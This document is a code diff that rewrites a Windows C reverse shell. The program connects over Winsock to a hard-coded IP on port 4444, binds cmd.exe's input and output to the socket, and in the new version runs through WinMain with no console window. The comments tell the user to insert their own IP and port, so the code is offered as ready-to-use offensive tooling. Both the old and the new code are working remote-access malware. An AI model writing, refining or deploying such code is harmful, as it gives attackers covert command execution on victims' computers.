@@ -1,71 +1,46 @@
 #include <winsock2.h>
 #include <windows.h>
+#include <stdlib.h>
 #include <stdio.h>
 
-#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
-#define SERVER_IP "10.0.1.35" // Connects to localhost
-#define SERVER_PORT 4444    // Port to connect to
-#define DEFAULT_BUFLEN 1024
-
-void ReverseShell() {
-    WSADATA wsaData;
-    SOCKET sock = INVALID_SOCKET;
+void ExecuteReverseShell() {
+    WSADATA wsa;
+    SOCKET sock;
     struct sockaddr_in server;
-
-    // Initialize Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        return;
-    }
-
-    // Create a socket
-    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET) {
-        WSACleanup();
-        return;
-    }
-
-    // Configure the server address
-    server.sin_family = AF_INET;
-    server.sin_port = htons(SERVER_PORT);
-    server.sin_addr.s_addr = inet_addr(SERVER_IP);
-
-    // Connect to the server
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
-
-    // Redirect input/output/error streams
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
+
+    // Initialize Winsock
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    // Create socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_addr.s_addr = inet_addr("10.0.1.35"); // Replace with your IP
+    server.sin_family = AF_INET;
+    server.sin_port = htons(4444); // Replace with your port
+
+    // Connect to the server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+        exit(1);
+    }
+
+    // Setup structures for creating a process
     memset(&si, 0, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = (HANDLE)sock;
-    si.hStdOutput = (HANDLE)sock;
-    si.hStdError = (HANDLE)sock;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
-    // Launch cmd.exe
-    char command[] = "cmd.exe";
-    if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
-        closesocket(sock);
-        WSACleanup();
-        return;
-    }
+    // Launch a shell
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 
-    // Wait for the process to exit
-    WaitForSingleObject(pi.hProcess, INFINITE);
-
-    // Cleanup
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    // Clean up
     closesocket(sock);
     WSACleanup();
 }
 
-int main() {
-    ReverseShell();
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    ExecuteReverseShell();
     return 0;
 }
